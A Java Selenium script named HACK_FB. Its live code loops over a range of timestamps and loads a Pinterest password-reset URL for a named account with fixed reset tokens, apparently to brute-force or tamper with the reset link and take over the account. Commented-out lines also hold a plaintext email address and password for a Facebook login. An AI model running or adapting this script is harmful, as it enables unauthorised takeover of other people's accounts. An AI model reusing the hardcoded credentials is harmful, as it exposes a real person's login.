package FB_AutoPost_Groups;

import java.io.File; 
import java.io.FileInputStream; 
import java.io.FileNotFoundException; 
import java.io.IOException; 
import java.lang.reflect.InvocationTargetException; 
import java.util.concurrent.TimeUnit;   

import org.apache.poi.xssf.usermodel.XSSFSheet; 
import org.apache.poi.xssf.usermodel.XSSFWorkbook; 
import org.openqa.selenium.*;   
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.firefox.FirefoxBinary;
import org.openqa.selenium.firefox.FirefoxDriver;
import org.openqa.selenium.firefox.FirefoxProfile;
import org.openqa.selenium.htmlunit.HtmlUnitDriver;
import org.openqa.selenium.interactions.Action;
import org.openqa.selenium.interactions.Actions;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.util.Date;
import java.util.Random;
import java.util.StringTokenizer;

import org.openqa.selenium.Alert;
import org.openqa.selenium.Cookie;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.firefox.FirefoxDriver;

import com.gargoylesoftware.htmlunit.BrowserVersion;

 
public class HACK_FB {
		
 private static WebDriver driver = null;

  
 public static void main(String[] args) throws InterruptedException, IOException {   
  System.setProperty("webdriver.chrome.driver", "C://Selenium_Training//chromedriver.exe");
 WebDriver driver=new ChromeDriver();
//driver.get("www.google.com");
 
// driver.findElement(By.id("email")).sendKeys("blueonelove82@gmail.com");
 //driver.findElement(By.id("pass")).sendKeys("america@098");  
 //driver.findElement(By.id("loginbutton")).click();
 //driver.manage().timeouts().implicitlyWait(30, TimeUnit.SECONDS);

 //alert.dismiss();
 //WebDriverWait wait = new WebDriverWait(driver, 20);
//driver.switchTo().activeElement().click();

//driver.switchTo().alert().accept();
 //Accepting alert.
 //alert.accept();
//driver.findElement(null).sendKeys(Keys.ESCAPE);
 Random randomGenerator = new Random();
 int randomInt = randomGenerator.nextInt(10);
 
 Thread.sleep(randomInt);	
 Thread.sleep(10000);
 
 
 try { 
 //FileInputStream file = new FileInputStream(new File("C://New folder//testdata.xlsx")); 
 //XSSFWorkbook workbook = new XSSFWorkbook(file); 
 //XSSFSheet sheet = workbook.getSheetAt(0); 
  
   //for (int i =101; i <= sh	eet.ge	tLastRowNum(); i++)
	   for (int i =1457592800; i <=1457592920; i++)
    	 { 
            //driver.switchTo().activeElement().click();
         Thread.sleep(randomInt);
         
         driver.get("https://www.pinterest.com/pw/techyvicky?e="+i+"&amp=&t=a046184a782244416b628c257d3ad680&utm_campaign=pwreset&e_t=c3e3c566decd4e45a18cd3bf9dda4ab7&utm_medium=2000&utm_source=31&e_t_s=cta");
     
         //Posting status or message in groups
         
    	 }    
 }
         
         catch(Exception e)
         {
        	 
         }
    	 }
}